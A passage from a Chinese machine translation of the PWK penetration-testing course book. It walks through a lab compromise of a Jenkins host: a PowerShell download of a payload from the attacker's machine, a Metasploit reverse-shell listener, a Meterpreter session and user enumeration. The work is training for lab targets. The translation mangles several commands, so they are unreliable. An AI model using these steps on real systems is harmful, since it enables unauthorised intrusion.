</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:32715;left:362"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 367：打开 Jenkins 构建</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:32746;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这将打开“控制台输出”页面，显示</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">whoami</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令</font><font style="vertical-align: inherit;">的输出</font><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:33073;left:316"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 368：查看 whoami 构建控制台输出</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:33103;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根据输出，Jenkins 正在以</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cevapi\jenkinsuser</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">帐户</font><font style="vertical-align: inherit;">运行代码</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">接着就，随即</font></font></nobr></div>
<div style="position:absolute;top:33123;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">信息方便，我们可以开始尝试获取一个meterpreter shell。</font></font></nobr></div>
<div style="position:absolute;top:33156;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以肯定的是，由于 Poultry 使用了防病毒软件，Cevapi 也会使用。</font><font style="vertical-align: inherit;">我们应该</font></font></nobr></div>
<div style="position:absolute;top:33175;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">能够使用我们之前生成的同一个 whoami 后门 shell 并尝试获得一个</font></font></nobr></div>
<div style="position:absolute;top:33194;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Cevapi 上的 meterpreter 外壳。</font><font style="vertical-align: inherit;">我们首先必须设置一个网络服务器来下载 shell，</font></font></nobr></div>
<div style="position:absolute;top:33214;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用Jenkins下载shell，在Kali上启动metasploit listener，最后运行后门</font></font></nobr></div>
<div style="position:absolute;top:33233;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用詹金斯可执行。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:33439;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="29"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 29 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:33472;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:34549;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:34549;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:34549;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">838</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:33562;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.8.2.1.7</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:33583;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">首先，让我们创建一个新目录，并将旧的 whoami.exe 有效负载复制到该目录中。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:33618;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cd ~</font></font></font></b></nobr></div>
<div style="position:absolute;top:33634;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mkdir cevapi</font></font></font></b></nobr></div>
<div style="position:absolute;top:33651;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cd cevapi/</font></font></font></b></nobr></div>
<div style="position:absolute;top:33669;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~/cevapi$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cp ../poultry/whoami.exe ./</font></font></font></b></nobr></div>
<div style="position:absolute;top:33688;left:311"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 986 - 为 Cevapi 创建一个工作目录</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:33718;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，我们将启动一个 HTTP 服务器以允许 Cevapi 下载有效负载。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:33752;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~/cevapi$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo python3 -m http.server 80</font></font></font></b></nobr></div>
<div style="position:absolute;top:33769;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 0.0.0.0 端口 80 (http://0.0.0.0:80/) 上提供 HTTP ...</font></font></nobr></div>
<div style="position:absolute;top:33788;left:357"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 987 - 启动一个 HTTP 服务器</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:33818;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 Jenkins 中，我们将</font><font style="vertical-align: inherit;">在面包屑中</font><font style="vertical-align: inherit;">单击</font><font style="vertical-align: inherit;">屏幕左上角</font><font style="vertical-align: inherit;">的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">访问</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">链接。</font><font style="vertical-align: inherit;">这</font></font></nobr></div>
<div style="position:absolute;top:33837;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将带我们回到访问项目页面。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:34346;left:374"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 369：访问项目页面 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:34627;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="30"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 30 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:34660;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:35737;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:35737;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:35737;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">839</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:34750;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.8.2.1.8</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:34771;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来我们点击</font><font style="vertical-align: inherit;">侧边栏中的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Configure</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，打开配置页面，我们可以在里面修改</font></font></nobr></div>
<div style="position:absolute;top:34790;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">构建命令。</font><font style="vertical-align: inherit;">我们将尝试使用 PowerShell 下载文件。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:35160;left:297"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 370：下载有效负载的 Powershell 命令</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:35191;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">更具体地说，我们将使用</font><i><font style="vertical-align: inherit;">System.Net.WebClient</font></i><font style="vertical-align: inherit;">对象中</font><font style="vertical-align: inherit;">的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DownloadFile</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">方法</font><font style="vertical-align: inherit;">来</font></font><i><font style="vertical-align: inherit;"></font></i><font style="vertical-align: inherit;"></font></nobr></div>
<div style="position:absolute;top:35210;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">传入我们的 Kali IP 地址和我们希望在文件系统上下载文件的位置。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:35245;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.11.0.4/whoami</font></font></nobr></div>
<div style="position:absolute;top:35262;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">.exe', 'c:\Users\Public\whoami.exe')</font></font></nobr></div>
<div style="position:absolute;top:35282;left:303"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 988 - 用于下载 whoami.exe 的命令</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:35311;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置 PowerShell 命令后，我们将单击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Save</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，这将带我们回到“Access”项</font></font></nobr></div>
<div style="position:absolute;top:35330;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">页。</font><font style="vertical-align: inherit;">从这里，我们选择</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Build Now</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来执行命令。</font><font style="vertical-align: inherit;">如果命令有效，我们将</font></font></nobr></div>
<div style="position:absolute;top:35350;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在我们的 Python HTTP 服务器中看到一个日志条目。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:35385;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 0.0.0.0 端口 80 (http://0.0.0.0:80/) 上提供 HTTP ...</font></font></nobr></div>
<div style="position:absolute;top:35402;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.250 - - [12/Dec/2019 11:44:49] “ </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">GET /whoami.exe</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> HTTP/1.1” 200 -</font></font></nobr></div>
<div style="position:absolute;top:35421;left:331"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 989 - 查看 HTTP 服务器日志</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:35450;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在我们的文件已下载，我们可以停止 Python HTTP 服务器并使用以下命令启动 msfconsole</font></font></nobr></div>
<div style="position:absolute;top:35470;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最初用于生成有效负载的适当参数。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:35505;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ sudo msfconsole -q -x "使用exploit/multi/handler;\</font></font></nobr></div>
<div style="position:absolute;top:35522;left:319"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置 PAYLOAD windows/meterpreter/reverse_tcp;\</font></font></nobr></div>
<div style="position:absolute;top:35539;left:319"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置 LHOST 10.11.0.4;\</font></font></nobr></div>
<div style="position:absolute;top:35555;left:319"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置 LPORT 80;\</font></font></nobr></div>
<div style="position:absolute;top:35572;left:319"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">跑步”</font></font></nobr></div>
<div style="position:absolute;top:35590;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:35607;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 在 10.11.0.4:80 启动反向 TCP 处理程序</font></font></nobr></div>
<div style="position:absolute;top:35626;left:364"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 990 - 启动 msfconsole</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:35655;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，我们将回到 Jenkins 并重新配置该项目以运行 shell。</font><font style="vertical-align: inherit;">这可以通过</font></font></nobr></div>
<div style="position:absolute;top:35675;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将要执行的命令设置为下载的二进制文件的路径。</font><font style="vertical-align: inherit;">当我们准备好</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:35815;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="31"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 31 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:35848;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:36925;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:36925;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:36925;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">840</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:35944;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">捕获 shell，我们</font><font style="vertical-align: inherit;">在 Jenkins 中</font><font style="vertical-align: inherit;">单击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Build Now</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">如果一切按计划进行，我们应该</font></font></nobr></div>
<div style="position:absolute;top:35963;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 metasploit 中捕获反向 shell。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:35998;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 发送阶段（180291 字节）到 10.11.1.250</font></font></nobr></div>
<div style="position:absolute;top:36015;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] Meterpreter 会话 1 在 2019-12-12 12 打开 (10.11.0.4:80 -&gt; 10.11.1.250:12165)：</font></font></nobr></div>
<div style="position:absolute;top:36032;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">07:30 -0700</font></font></nobr></div>
<div style="position:absolute;top:36066;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Meterpreter &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">外壳</font></font></font></b></nobr></div>
<div style="position:absolute;top:36083;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进程 4688 已创建。</font></font></nobr></div>
<div style="position:absolute;top:36100;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">频道 1 已创建。</font></font></nobr></div>
<div style="position:absolute;top:36117;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft Windows [版本 10.0.15063]</font></font></nobr></div>
<div style="position:absolute;top:36134;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(c) 2017 年微软公司。</font><font style="vertical-align: inherit;">版权所有。</font></font></nobr></div>
<div style="position:absolute;top:36168;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Program Files (x86)\Jenkins\workspace\Access&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">whoami</font></font></font></b></nobr></div>
<div style="position:absolute;top:36185;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我是谁</font></font></nobr></div>
<div style="position:absolute;top:36202;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cevapi\jenkinsuser</font></font></nobr></div>
<div style="position:absolute;top:36235;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Program Files (x86)\Jenkins\workspace\asdf&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网络用户 jenkinsuser</font></font></font></b></nobr></div>
<div style="position:absolute;top:36252;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">净用户 jenkinsuser</font></font></nobr></div>
<div style="position:absolute;top:36269;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户名    </font></font></nobr></div>
<div style="position:absolute;top:36269;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">詹金斯瑟</font></font></nobr></div>
<div style="position:absolute;top:36287;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">全名    </font></font></nobr></div>
<div style="position:absolute;top:36304;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">评论    </font></font></nobr></div>
<div style="position:absolute;top:36320;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户评论    </font></font></nobr></div>
<div style="position:absolute;top:36337;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">国家/地区代码    </font></font></nobr></div>
<div style="position:absolute;top:36337;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">000（系统默认）</font></font></nobr></div>
<div style="position:absolute;top:36354;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">帐户有效    </font></font></nobr></div>
<div style="position:absolute;top:36354;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是的</font></font></nobr></div>
<div style="position:absolute;top:36371;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">帐户过期    </font></font></nobr></div>
<div style="position:absolute;top:36371;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">绝不</font></font></nobr></div>
<div style="position:absolute;top:36405;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最后设置的密码    </font></font></nobr></div>
<div style="position:absolute;top:36405;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2019/10/31 上午 6:10:50</font></font></nobr></div>
<div style="position:absolute;top:36422;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码过期    </font></font></nobr></div>
<div style="position:absolute;top:36422;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">绝不</font></font></nobr></div>
<div style="position:absolute;top:36439;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码可更改    </font></font></nobr></div>
<div style="position:absolute;top:36439;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2019/11/1 上午 6:10:50</font></font></nobr></div>
<div style="position:absolute;top:36456;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要求输入密码    </font></font></nobr></div>
<div style="position:absolute;top:36456;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不</font></font></nobr></div>
<div style="position:absolute;top:36473;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户可以更改密码 是</font></font></nobr></div>
<div style="position:absolute;top:36507;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">允许使用工作站    </font></font></nobr></div>
<div style="position:absolute;top:36507;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">全部</font></font></nobr></div>
<div style="position:absolute;top:36524;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">登录脚本    </font></font></nobr></div>
<div style="position:absolute;top:36541;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户资料    </font></font></nobr></div>
<div style="position:absolute;top:36558;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主目录    </font></font></nobr></div>
<div style="position:absolute;top:36575;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">上次登录    </font></font></nobr></div>
<div style="position:absolute;top:36575;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2020/1/1 下午 2:07:01</font></font></nobr></div>
<div style="position:absolute;top:36609;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">允许登录时间    </font></font></nobr></div>
<div style="position:absolute;top:36609;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">全部</font></font></nobr></div>
<div style="position:absolute;top:36643;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">本地组成员*用户    </font></font></nobr></div>
<div style="position:absolute;top:36660;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">全球组成员资格 *无    </font></font></nobr></div>
<div style="position:absolute;top:36677;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令成功完成。</font></font></nobr></div>
<div style="position:absolute;top:36696;left:375"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 991 - 获得一个 shell</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:36725;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">正如预期的那样，运行 Jenkins 构建的用户名为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">jenkinsuser</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">该用户也不是</font></font></nobr></div>
<div style="position:absolute;top:36745;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在任何管理员组中。</font><font style="vertical-align: inherit;">现在我们有了一个 shell，让我们枚举 Cevapi，希望</font></font></nobr></div>
<div style="position:absolute;top:36764;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">发现特权升级。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:36799;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.8.3</font></font></i></nobr></div>
<div style="position:absolute;top:36799;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开发后枚举</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:36837;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这是退后一步，看看我们目前所拥有的东西的好时机。</font><font style="vertical-align: inherit;">我们有两个妥协</font></font></nobr></div>
<div style="position:absolute;top:36856;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Linux 主机（Ajla 和 Zora）。</font><font style="vertical-align: inherit;">第一个主机在外部网络中运行，第二个在内部网络中运行</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:37003;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="32"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 32 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:37036;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:38113;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:38113;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:38113;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">841</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:37132;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网络。</font><font style="vertical-align: inherit;">我们还有 Poultry，一个加入域的 Windows 主机，在</font></font></nobr></div>
<div style="position:absolute;top:37151;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">内部网络。</font><font style="vertical-align: inherit;">最后，我们目前正在妥协 Cevapi。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:37464;left:326"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 371：包括 Cevapi 的网络图</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:37495;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在我们开始过多地探索 Cevapi 之前，我们将首先检查当前用户的</font></font></nobr></div>
<div style="position:absolute;top:37514;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">权限是。</font><font style="vertical-align: inherit;">我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">whoami /priv</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令</font><font style="vertical-align: inherit;">来做到这一点</font><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:37549;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Program Files&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">whoami /priv</font></font></font></b></nobr></div>
<div style="position:absolute;top:37566;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">whoami /隐私</font></font></nobr></div>
<div style="position:absolute;top:37601;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">特权信息</font></font></nobr></div>
<div style="position:absolute;top:37618;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">---------------</font></font></nobr></div>
<div style="position:absolute;top:37651;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">权限名称    </font></font></nobr></div>
<div style="position:absolute;top:37651;left:352"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">描述    </font></font></nobr></div>
<div style="position:absolute;top:37651;left:692"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">状态   </font></font></nobr></div>
<div style="position:absolute;top:37668;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">================================================== ============================</font></font></nobr></div>
